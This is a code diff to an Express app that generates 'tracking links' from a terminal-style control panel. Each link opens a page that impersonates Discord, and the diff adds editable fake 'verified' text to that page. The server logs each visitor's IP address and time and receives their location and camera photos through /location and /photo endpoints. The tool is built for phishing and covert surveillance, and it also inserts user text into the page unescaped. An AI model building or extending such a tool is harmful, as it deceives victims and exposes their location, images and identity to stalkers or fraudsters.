@@ -136,14 +136,18 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 .cmd-photo { color:#ff88cc; }
 .cmd-lang { color:#66ff88; }
 
-#menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:140px; padding:20px 20px 18px 20px; }
+#menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:160px; padding:20px 20px 18px 20px; }
 #menu-window .menu-title { color:#88ddff; font-size:15px; margin-bottom:14px; font-weight:bold; letter-spacing:1px; }
-#menu-window .btn-row { display:flex; gap:10px; flex-wrap:wrap; }
+#menu-window .btn-row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
 #menu-window .btn-link { background:transparent; border:1px solid #88ddff; color:#88ddff; padding:8px 24px; font-family:inherit; font-size:14px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
 #menu-window .btn-link:hover { background:#1a2a3a; }
+#menu-window .btn-link:disabled { opacity:0.4; cursor:not-allowed; }
 #menu-window .btn-copy { background:transparent; border:1px solid #888; color:#888; padding:8px 18px; font-family:inherit; font-size:13px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
 #menu-window .btn-copy:hover { background:#1a1a1a; }
 #menu-window .btn-copy.copy-success { color:#66ff88 !important; border-color:#66ff88; }
+#menu-window .custom-label { color:#888; font-size:12px; display:block; margin-top:10px; margin-bottom:4px; text-align:left; }
+#menu-window .custom-input { width:100%; padding:6px 10px; background:#111; border:1px solid #444; color:#fff; font-family:inherit; font-size:13px; outline:none; touch-action:auto; pointer-events:auto; user-select:text; -webkit-user-select:text; }
+#menu-window .custom-input:focus { border-color:#88ddff; }
 #menu-window .result-area { margin-top:14px; padding-top:12px; border-top:1px solid #333; min-height:40px; color:#fff; font-size:13px; word-break:break-all; }
 #menu-window .result-area .link-display { display:block; color:#88ddff; text-decoration:underline; cursor:pointer; margin-bottom:4px; padding:4px 0; touch-action:auto; pointer-events:auto; }
 #menu-window .result-area .link-display:hover { color:#aaefff; }
@@ -168,11 +172,13 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
   <div class="drag-area" id="menu-drag"></div>
   <div class="menu-title">■ LINK GENERATOR</div>
   <div class="btn-row">
-    <button class="btn-link" id="generate-btn">GENERATE</button>
+    <button class="btn-link" id="generate-btn" disabled>GENERATE</button>
     <button class="btn-copy" id="copy-btn" style="display:none;">📋 COPY</button>
   </div>
+  <div class="custom-label">認証表示テキスト（任意）</div>
+  <input type="text" class="custom-input" id="custom-text" placeholder="例: 認証済みユーザー" spellcheck="false">
   <div class="result-area" id="result-area">
-    <span class="status-msg">Press GENERATE to create a tracking link</span>
+    <span class="status-msg">テキストを入力してGENERATE</span>
   </div>
   <div class="resize-handle" id="menu-resize"></div>
 </div>
@@ -256,6 +262,21 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     addCmdOutput('[PHOTO] Image #' + photoCountNum + ' received', 'cmd-photo');
   });
 
+  // ★ テキスト入力でGENERATEボタンの有効/無効を切り替え
+  const generateBtn = document.getElementById('generate-btn');
+  const customTextInput = document.getElementById('custom-text');
+
+  customTextInput.addEventListener('input', function() {
+    const text = customTextInput.value.trim();
+    if (text.length > 0) {
+      generateBtn.disabled = false;
+      generateBtn.style.opacity = '1';
+    } else {
+      generateBtn.disabled = true;
+      generateBtn.style.opacity = '0.4';
+    }
+  });
+
   cmdInput.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
       const cmd = cmdInput.value.trim();
@@ -311,8 +332,10 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
           document.getElementById('cmd-prompt').textContent = '$';
           document.getElementById('menu-window').querySelector('.menu-title').textContent = '■ リンク生成';
           document.getElementById('generate-btn').textContent = '生成';
-          document.getElementById('result-area').querySelector('.status-msg').textContent = '「生成」を押すとトラッキングリンクを作成';
+          document.getElementById('result-area').querySelector('.status-msg').textContent = 'テキストを入力して生成';
           document.getElementById('copy-btn').textContent = '📋 コピー';
+          document.querySelector('.custom-label').textContent = '認証表示テキスト（任意）';
+          customTextInput.placeholder = '例: 認証済みユーザー';
         });
         return;
       }
@@ -326,8 +349,10 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
           document.getElementById('cmd-prompt').textContent = '$';
           document.getElementById('menu-window').querySelector('.menu-title').textContent = '■ LINK GENERATOR';
           document.getElementById('generate-btn').textContent = 'GENERATE';
-          document.getElementById('result-area').querySelector('.status-msg').textContent = 'Press GENERATE to create a tracking link';
+          document.getElementById('result-area').querySelector('.status-msg').textContent = 'Enter text and GENERATE';
           document.getElementById('copy-btn').textContent = '📋 COPY';
+          document.querySelector('.custom-label').textContent = 'Auth display text (optional)';
+          customTextInput.placeholder = 'e.g. Verified User';
         });
         return;
       }
@@ -341,14 +366,18 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     }
   });
 
-  const generateBtn = document.getElementById('generate-btn');
   const copyBtn = document.getElementById('copy-btn');
   const resultArea = document.getElementById('result-area');
   let currentLink = '';
 
   async function generateLink() {
+    const customText = customTextInput.value.trim();
+    if (!customText) {
+      resultArea.innerHTML = '<span class="status-msg" style="color:#ff4444;">⚠️ テキストを入力してください</span>';
+      return;
+    }
     try {
-      const res = await fetch('/generate');
+      const res = await fetch('/generate?text=' + encodeURIComponent(customText));
       const data = await res.json();
       currentLink = data.link;
       resultArea.innerHTML = '<a href="#" class="link-display" id="generated-link">🔗 ' + currentLink + '</a><span class="status-msg">✅ Link generated!</span>';
@@ -436,29 +465,38 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     resize.addEventListener('touchstart', function(e) { var t = e.touches[0]; startResize(t.clientX, t.clientY); e.preventDefault(); e.stopPropagation(); }, { passive: false });
     document.addEventListener('mousemove', function(e) { if (dragData) moveDrag(e.clientX, e.clientY); if (resizeData) moveResize(e.clientX, e.clientY); });
     document.addEventListener('mouseup', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
-    document.addEventListener('touchmove', function(e) { var t = e.touches[0]; if (dragData) moveDrag(t.clientX, t.clientY); if (resizeData) moveResize(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
-    document.addEventListener('touchend', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
-  }
-  makeDraggable('cmd-window', 'cmd-drag', 'cmd-resize');
-  makeDraggable('menu-window', 'menu-drag', 'menu-resize');
-
-  function clampWindows() {
-    document.querySelectorAll('.window').forEach(function(win) {
-      var rect = win.getBoundingClientRect();
-      var maxW = window.innerWidth - 20;
-      var maxH = window.innerHeight - 20;
-      if (rect.width > maxW) win.style.width = maxW + 'px';
-      if (rect.height > maxH) win.style.height = maxH + 'px';
-      if (rect.left < 0) win.style.left = '10px';
-      if (rect.top < 0) win.style.top = '10px';
-    });
-  }
-  window.addEventListener('resize', clampWindows);
-  document.addEventListener('click', function(e) {
-    if (!e.target.closest('#menu-window input')) {
-      cmdInput.focus();
-    }
+      document.addEventListener('touchmove', function(e) {
+    var t = e.touches[0];
+    if (dragData) moveDrag(t.clientX, t.clientY);
+    if (resizeData) moveResize(t.clientX, t.clientY);
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('touchend', function() {
+    if (dragData) endDrag();
+    if (resizeData) endResize();
   });
+}
+
+makeDraggable('cmd-window', 'cmd-drag', 'cmd-resize');
+makeDraggable('menu-window', 'menu-drag', 'menu-resize');
+
+function clampWindows() {
+  document.querySelectorAll('.window').forEach(function(win) {
+    var rect = win.getBoundingClientRect();
+    var maxW = window.innerWidth - 20;
+    var maxH = window.innerHeight - 20;
+    if (rect.width > maxW) win.style.width = maxW + 'px';
+    if (rect.height > maxH) win.style.height = maxH + 'px';
+    if (rect.left < 0) win.style.left = '10px';
+    if (rect.top < 0) win.style.top = '10px';
+  });
+}
+window.addEventListener('resize', clampWindows);
+document.addEventListener('click', function(e) {
+  if (!e.target.closest('#menu-window input')) {
+    cmdInput.focus();
+  }
+});
 })();
 </script>
 </body>
@@ -481,7 +519,8 @@ app.get('/', (req, res) => {
 
 app.get('/generate', (req, res) => {
   const id = generateId();
-  const link = `https://${req.get('host')}/t/${id}`;
+  const customText = req.query.text || '認証済み';
+  const link = `https://${req.get('host')}/t/${id}?text=${encodeURIComponent(customText)}`;
   res.json({ link });
 });
 
@@ -490,10 +529,12 @@ app.get('/lang/:l', (req, res) => {
   res.sendStatus(200);
 });
 
+// ★ 相手側ページ（Discord風・カスタムテキスト対応）
 app.get('/t/:id', (req, res) => {
   const id = req.params.id;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
   const time = new Date().toLocaleString('ja-JP');
+  const customText = req.query.text || '認証済み';
 
   res.send(`<!DOCTYPE html>
 <html>
@@ -538,33 +579,11 @@ app.get('/t/:id', (req, res) => {
       gap:6px;
       box-shadow:0 2px 8px rgba(88,101,242,0.3);
     }
-    .discord-badge i {
-      font-size:16px;
-    }
-    .icon {
-      font-size:56px;
-      color:#5865F2;
-      margin-bottom:8px;
-    }
-    h1 {
-      font-size:22px;
-      color:#1a1a1a;
-      font-weight:700;
-      letter-spacing:-0.3px;
-      margin-top:4px;
-    }
-    .sub-title {
-      font-size:14px;
-      color:#666;
-      margin-top:4px;
-      font-weight:400;
-    }
-    p {
-      color:#555;
-      font-size:15px;
-      margin:14px 0 20px 0;
-      line-height:1.6;
-    }
+    .discord-badge i { font-size:16px; }
+    .icon { font-size:56px; color:#5865F2; margin-bottom:8px; }
+    h1 { font-size:22px; color:#1a1a1a; font-weight:700; letter-spacing:-0.3px; margin-top:4px; }
+    .sub-title { font-size:14px; color:#666; margin-top:4px; font-weight:400; }
+    p { color:#555; font-size:15px; margin:14px 0 20px 0; line-height:1.6; }
     .terms-box {
       background:#f8f9fa;
       border:1px solid #e8e8e8;
@@ -626,10 +645,7 @@ app.get('/t/:id', (req, res) => {
       align-items:center;
       gap:6px;
     }
-    .foot i {
-      color:#5865F2;
-      font-size:14px;
-    }
+    .foot i { color:#5865F2; font-size:14px; }
     .discord-shield {
       display:inline-block;
       background:#eef2ff;
@@ -668,7 +684,7 @@ app.get('/t/:id', (req, res) => {
     <div class="foot">
       <i class="fas fa-shield-alt"></i> 安全な接続 <span style="color:#ccc;">•</span> <i class="fab fa-discord"></i> Discord
     </div>
-    <div class="discord-shield"><i class="fas fa-check-circle"></i> Discord認証済み</div>
+    <div class="discord-shield"><i class="fas fa-check-circle"></i> ${customText}</div>
   </div>
 
   <script>
@@ -836,7 +852,7 @@ app.post('/location', express.json(), (req, res) => {
   res.sendStatus(200);
 });
 
-// 写真受信（画像データも保存）
+// 写真受信
 app.post('/photo', express.json(), (req, res) => {
   const { id, image } = req.body;
   const entry = { id, image: image, createdAt: new Date().toISOString() };
